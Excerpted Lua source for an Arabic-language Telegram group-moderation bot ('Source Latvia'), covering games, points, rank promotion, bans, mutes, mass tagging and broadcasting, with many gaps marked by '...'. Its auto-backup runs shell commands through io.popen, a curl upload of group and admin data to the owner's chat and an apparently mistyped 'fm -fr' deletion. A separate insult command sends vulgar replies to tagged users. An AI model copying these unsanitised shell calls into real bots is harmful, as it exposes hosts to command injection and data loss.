DevRio:del(Latvia..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(Latvia.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevRio:incrby(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevRio:incrby(Latvia..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevRio:get(Latvia..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevRio:del(Latvia..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(Latvia.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevRio:get(Latvia..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevRio:get(Latvia..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
...
DevRio:set(Latvia.."GAMES:NUM"..msg.chat_id_,Num) 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙اهلا بك عزيزي في لعبة التخمين ↫ ⤈\n ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n᥀︙سيتم تخمين عدد ما بين الـ1 والـ20 اذا تعتقد انك تستطيع الفوز جرب واللعب الان .\n᥀︙ملاحظه لديك ثلاث محاولات فقط فكر قبل ارسال تخمينك !', 1, 'md')
DevRio:setex(Latvia.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_, 100, true)  
return false  
end
end
--     Source Latvia     --
...
if not DevRio:get(Latvia..'Rio:Lock:Games'..msg.chat_id_) then
DevRio:del(Latvia.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:del(Latvia..'Rio:ListRolet'..msg.chat_id_)  
DevRio:setex(Latvia.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_,3600,true)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙حسنا لنلعب , ارسل عدد اللاعبين للروليت .', 1, 'md')
return false  
end
end
if text and text:match("^(%d+)$") and DevRio:get(Latvia.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_) then
if text == "1" then
Text = "᥀︙لا استطيع بدء اللعبه بلاعب واحد فقط"
else
DevRio:set(Latvia.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_,text)  
Text = '᥀︙تم بدء تسجيل اللسته يرجى ارسال المعرفات \n᥀︙الفائز يحصل على 5 نقاط عدد المطلوبين ↫ '..text..' لاعب'
end
DevRio:del(Latvia.."Rio:StartRolet"..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,Text)
return false
end
if text and text:match('^(@[%a%d_]+)$') and DevRio:get(Latvia.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) then 
if DevRio:sismember(Latvia..'Rio:ListRolet'..msg.chat_id_,text) then
...
DevRio:sadd(Latvia..'Rio:ListRolet'..msg.chat_id_,text)
local CountAdd = DevRio:get(Latvia.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_)
local CountAll = DevRio:scard(Latvia..'Rio:ListRolet'..msg.chat_id_)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
DevRio:del(Latvia.."Rio:NumRolet"..msg.chat_id_..msg.sender_user_id_) 
DevRio:setex(Latvia.."Rio:WittingStartRolet"..msg.chat_id_..msg.sender_user_id_,1400,true) 
...
DevRio0 = (DevRio:get(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) * 50)
DevRio:incrby(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_,DevRio0)
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙تم بيع '..(DevRio:get(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_))..' من نقاطك\n᥀︙كل نقطه تساوي 50 رساله', 'md')
DevRio:del(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)
end
end
--     Source Latvia     --
...
DevRio:sadd(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,Manager_id)  
DevRio:sadd(Latvia..'Rio:RioConstructor:'..msg.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
if DevRio:get(Latvia.."Rio:Left:Bot"..Latvia) then
...
local msguser = tonumber(DevRio:get(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = DevRio:get(Latvia..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(DevRio:get(Latvia..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(DevRio:get(Latvia..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)
if result.username_ then username = '@'..result.username_ else username = 'لا يوجد' end
...
DevRio:setex(Latvia..'DevRio4'..msg.sender_user_id_,360,true)
...
function LatviaTeam(extra,result,success)
if DevRio:get(Latvia.."Rio:Send:Bot"..Latvia) and not RioSudo(msg) then 
send(msg.chat_id_, msg.id_,"᥀︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
local GpList = DevRio:smembers(Latvia.."Rio:Groups")
for k,v in pairs(GpList) do
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = result.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end
local PvList = DevRio:smembers(Latvia.."Rio:Users")
...
DevRio:set(Latvia..'Rio:viewget'..msg.sender_user_id_,true)
...
Text = [[
Welcome To Source
᥀︙[Latvia Team](https://t.me/latviateam)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ Source Channel',url="https://t.me/latviateam"}},
{{text = '᥀ Developer',url="t.me/opmni"},{text = '᥀ Tws Latvia',url="https://t.me/opmnibot"}}
}
local msg_id = msg.id_/2097152/0.5
...
if DevRio:get(Latvia.."Rio:Kick:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(Latvia..'yes'..msg.sender_user_id_, 'delyes')
DevRio:set(Latvia..'no'..msg.sender_user_id_, 'delno')
...
DevRio:set(Latvia.."Rio:Kick:Me"..msg.chat_id_, true)
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
DevRio:del(Latvia.."Rio:Kick:Me"..msg.chat_id_)
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر اطردني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
end
--     Source Latvia     --
if text == "نزلني" and ChCheck(msg) then
if DevRio:get(Latvia.."Rio:Del:Me"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
DevRio:set(Latvia..'yesdel'..msg.sender_user_id_, 'delyes')
DevRio:set(Latvia..'nodel'..msg.sender_user_id_, 'delno')
...
DevRio:set(Latvia.."Rio:Del:Me"..msg.chat_id_, true)
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
DevRio:del(Latvia.."Rio:Del:Me"..msg.chat_id_)
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل امر نزلني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
end
--     Source Latvia     --
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:Lock:TagAll'..msg.chat_id_)
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:Lock:TagAll'..msg.chat_id_,true)
end
if Admin(msg) then
if text == "تاك للكل" and ChCheck(msg) then
if not DevRio:get(Latvia..'Rio:Lock:TagAll'..msg.chat_id_) then
function TagAll(dp1,dp2)
local text = "᥀︙وينكم يالربع \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if DevRio:get(Latvia..'Save:UserName'..v.user_id_) then
text = text..i.."~ : [@"..DevRio:get(Latvia..'Save:UserName'..v.user_id_).."]\n"
else
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia.."Rio:Lock:TagAll")
end
if text == 'تعطيل ملف TagAll.lua' or text == 'تعطيل @all' or text == 'تعطيل all' or text == '↫ تعطيل all ᥀' then   
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للأعضاء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia.."Rio:Lock:TagAll",true) 
end 
if text and (text == "all" or text == "@all" or text == "#all") then
if (text and not DevRio:get(Latvia.."Rio:Lock:TagAll")) then
if DevRio:get(Latvia.."Rio:TagAll:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevRio:setex(Latvia..'Rio:TagAll:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia.."Rio:Lock:TagAdmins")
end
if text == 'تعطيل @admin' or text == 'تعطيل admin' or text == '↫ تعطيل admin ᥀' then   
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للمشرفين'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia.."Rio:Lock:TagAdmins",true) 
end 
if text == "admin" or text == "@admin" or text == "#admin" then
if (text and not DevRio:get(Latvia.."Rio:Lock:TagAdmins")) then
if DevRio:get(Latvia.."Rio:TagAdmins:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevRio:setex(Latvia..'Rio:TagAdmins:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
--     Source Latvia     --
if (text and not DevRio:get(Latvia.."Rio:Lock:AutoFile")) then
Time = DevRio:get(Latvia.."Rio:AutoFile:Time")
if Time then 
...
Welcomes = DevRio:get(Latvia..'Rio:Groups:Welcomes'..v) or ''
RioConstructors = DevRio:smembers(Latvia..'Rio:RioConstructor:'..v)
BasicConstructors = DevRio:smembers(Latvia..'Rio:BasicConstructor:'..v)
Constructors = DevRio:smembers(Latvia..'Rio:Constructor:'..v)
Managers = DevRio:smembers(Latvia..'Rio:Managers:'..v)
Admis = DevRio:smembers(Latvia..'Rio:Admins:'..v)
Vips = DevRio:smembers(Latvia..'Rio:VipMem:'..v)
if k == 1 then
...
local curl = 'curl "' .. Rio .. '" -F "chat_id='..DevId..'" -F "document=@'..Latvia..'.json' .. '" -F "caption=᥀︙نسخه تلقائيه تحتوي على ↫ '..#list..' مجموعه"'
io.popen(curl)
io.popen('fm -fr '..Latvia..'.json')
DevRio:set(Latvia.."Rio:AutoFile:Time",os.date("%x"))
end
else 
DevRio:set(Latvia.."Rio:AutoFile:Time",os.date("%x"))
end
...
local EntryNumber = (DevRio:get(Latvia..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevRio:get(Latvia..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevRio:get(Latvia..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
...
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(Latvia..'Rio:msg:Rio'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local LatviaTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل تفاعلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LatviaTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(Latvia..'Rio:msg:Rio'..msg.chat_id_,true)  
end
if DevRio:get(Latvia.."Rio:msg:Rio"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevRio:get(Latvia.."Rio:msg:Rio"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevRio:setex(Latvia..'Rio:msg:Rio'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
...
get_msg = DevRio:get(Latvia.."Rio:msg:Rio"..result.sender_user_id_..":"..msg.chat_id_) or 0
...
--     Source Latvia     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevRio:get(Latvia..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevRio:get(Latvia..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
...
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevRio:del(Latvia..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevRio:del(Latvia..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source Latvia     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevRio:get(Latvia..'Rio:Lock:Stupid'..msg.chat_id_) then
...
if DevRio:sismember(Latvia.."Rio:RioConstructor:"..msg.chat_id_,result.id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
...
Dev_Rio(msg.chat_id_, result.id_, 1,''..LatviaTeam[math.random(#LatviaTeam)], 1, 'html') 
else  
...
if DevRio:sismember(Latvia.."Rio:RioConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local LatviaTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
...
Dev_Rio(msg.chat_id_, result.id_, 1,''..LatviaTeam[math.random(#LatviaTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
...
if DevRio:sismember(Latvia..'Rio:RioSudo:',result.sender_user_id_) then
riosudo = 'المطورين الاساسيين • ' else riosudo = '' end
if DevRio:sismember(Latvia..'Rio:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevRio:sismember(Latvia..'Rio:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(Latvia..'Rio:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevRio:sismember(Latvia..'Rio:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(Latvia..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevRio:sismember(Latvia..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(Latvia..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(Latvia..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
...
DevRio:srem(Latvia..'Rio:RioSudo:', result.sender_user_id_)
DevRio:srem(Latvia..'Rio:SecondSudo:', result.sender_user_id_)
DevRio:srem(Latvia..'Rio:SudoBot:', result.sender_user_id_)
DevRio:srem(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Latvia..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Latvia..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Latvia..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Latvia..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Latvia..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
...
if DevRio:sismember(Latvia..'Rio:RioSudo:',result.id_) then
Riosudo = 'المطورين الاساسيين • ' else Riosudo = '' end
if DevRio:sismember(Latvia..'Rio:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevRio:sismember(Latvia..'Rio:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevRio:sismember(Latvia..'Rio:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevRio:sismember(Latvia..'Rio:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevRio:sismember(Latvia..'Rio:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevRio:sismember(Latvia..'Rio:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevRio:sismember(Latvia..'Rio:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevRio:sismember(Latvia..'Rio:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
...
if RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevRio:srem(Latvia..'Rio:RioSudo:', result.id_)
DevRio:srem(Latvia..'Rio:SecondSudo:', result.id_)
DevRio:srem(Latvia..'Rio:SudoBot:', result.id_)
DevRio:srem(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(Latvia..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(Latvia..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Latvia..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Latvia..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Latvia..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'riosudo' then
DevRio:srem(Latvia..'Rio:SecondSudo:', result.id_)
DevRio:srem(Latvia..'Rio:SudoBot:', result.id_)
DevRio:srem(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Latvia..'Rio:RioSudo:',result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(Latvia..'Rio:RioSudo:',result.id_)
...
DevRio:sadd(Latvia..'Rio:RioSudo:',user)
...
DevRio:srem(Latvia..'Rio:RioSudo:',user)
...
function sudo_reply(extra, result, success)
DevRio:sadd(Latvia..'Rio:SecondSudo:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Latvia..'Rio:SecondSudo:',result.id_)
...
DevRio:sadd(Latvia..'Rio:SecondSudo:',user)
...
DevRio:srem(Latvia..'Rio:SecondSudo:',user)
...
function sudo_reply(extra, result, success)
DevRio:sadd(Latvia..'Rio:SudoBot:',result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Latvia..'Rio:SudoBot:',result.id_)
...
DevRio:sadd(Latvia..'Rio:SudoBot:',user)
...
DevRio:srem(Latvia..'Rio:SudoBot:',user)
...
DevRio:sadd(Latvia..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Latvia..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Latvia..'Rio:Owner:'..msg.chat_id_,user)
...
DevRio:srem(Latvia..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
...
DevRio:srem(Latvia..'Rio:Owner:'..msg.chat_id_,result.id_)
...
DevRio:srem(Latvia..'Rio:Owner:'..msg.chat_id_,user)
...
function raf_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Latvia.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لاتستطيع رفع احد وذالك بسبب تعطيل الرفع', 1, 'md')
return false
end
DevRio:sadd(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevRio:srem(Latvia..'Rio:BasicConstructor:'..msg.chat_id_,user)
...
DevRio:sadd(Latvia..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(Latvia..'Rio:Constructor:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Latvia..'Rio:Constructor:'..msg.chat_id_,user)
...
DevRio:srem(Latvia..'Rio:Constructor:'..msg.chat_id_,user)
...
DevRio:sadd(Latvia..'Rio:Managers:'..msg.chat_id_,user)
...
DevRio:srem(Latvia..'Rio:Managers:'..msg.chat_id_,user)
...
DevRio:sadd(Latvia..'Rio:Cleaner:'..msg.chat_id_,result.sender_user_id_)
...
if result.id_ then
DevRio:sadd(Latvia..'Rio:Cleaner:'..msg.chat_id_,result.id_)
...
DevRio:sadd(Latvia..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevRio:srem(Latvia..'Rio:Cleaner:'..msg.chat_id_,user)
...
DevRio:sadd(Latvia..'Rio:Admins:'..msg.chat_id_,user)
...
DevRio:srem(Latvia..'Rio:Admins:'..msg.chat_id_,user)
...
DevRio:sadd(Latvia..'Rio:VipMem:'..msg.chat_id_,user)
...
DevRio:srem(Latvia..'Rio:VipMem:'..msg.chat_id_,user)
...
LatviaTeam = {"ها هلاو","انطق","كول","تفضل","احبك","عمري","لاف"};
...
DevRio:del(Latvia.."Rio:Lock:ProSet"..msg.chat_id_)
...
DevRio:set(Latvia.."Rio:Lock:ProSet"..msg.chat_id_,"true")
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل رفع ↫ المنشئ الاساسي • المنشئ • المدير • الادمن • المميز', 1, 'md')
end
end
--     Source Latvia     --
...
if not RioConstructor(msg) and DevRio:get(Latvia.."Rio:Lock:KickBan"..msg.chat_id_) then 
...
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(Latvia..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if not Constructor(msg) and DevRio:get(Latvia.."Rio:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'᥀︙لقد تم تعطيل الطرد والحظر من قبل مالك المجموعه')
return false
end
if result.id_ then
...
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(Latvia..'Rio:Ban:'..msg.chat_id_, result.id_)
...
ChatKick(msg.chat_id_, user)
DevRio:sadd(Latvia..'Rio:Ban:'..msg.chat_id_, user)
...
DevRio:srem(Latvia..'Rio:Ban:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
DevRio:srem(Latvia..'Rio:Ban:'..msg.chat_id_, result.id_)
...
DevRio:srem(Latvia..'Rio:Ban:'..msg.chat_id_, user)
...
if not RioConstructor(msg) and DevRio:get(Latvia.."Rio:Lock:MuteTked"..msg.chat_id_) then 
...
if DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(Latvia..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(Latvia..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو بالفعل مكتوم من المجموعه")  
else
DevRio:sadd(Latvia..'Rio:Muted:'..msg.chat_id_, user)
...
if not DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(Latvia..'Rio:Muted:'..msg.chat_id_, result.sender_user_id_)
...
if result.id_ then
if not DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(Latvia..'Rio:Muted:'..msg.chat_id_, result.id_)
...
if not DevRio:sismember(Latvia..'Rio:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","᥀︙هو ليس مكتوم لالغاء كتمه")  
else
DevRio:srem(Latvia..'Rio:Muted:'..msg.chat_id_, user)
...
DevRio:sadd(Latvia..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:sadd(Latvia..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevRio:sadd(Latvia..'Rio:Tkeed:'..msg.chat_id_, user)
...
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_, result.sender_user_id_)
...
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_, result.id_)
...
DevRio:srem(Latvia..'Rio:Tkeed:'..msg.chat_id_, user)
...
if DevRio:sismember(Latvia..'Rio:RioSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(Latvia..'Rio:SecondSudo:',result.sender_user_id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevRio:sadd(Latvia..'Rio:BanAll:', result.sender_user_id_)
...
if DevRio:sismember(Latvia..'Rio:RioSudo:',result.id_) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(Latvia..'Rio:SecondSudo:',result.id_) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevRio:sadd(Latvia..'Rio:BanAll:', result.id_)
...
if DevRio:sismember(Latvia..'Rio:RioSudo:',user) and not Sudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevRio:sismember(Latvia..'Rio:SecondSudo:',user) and not RioSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙*لاتستطيع حظر المطور الاساسي²*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
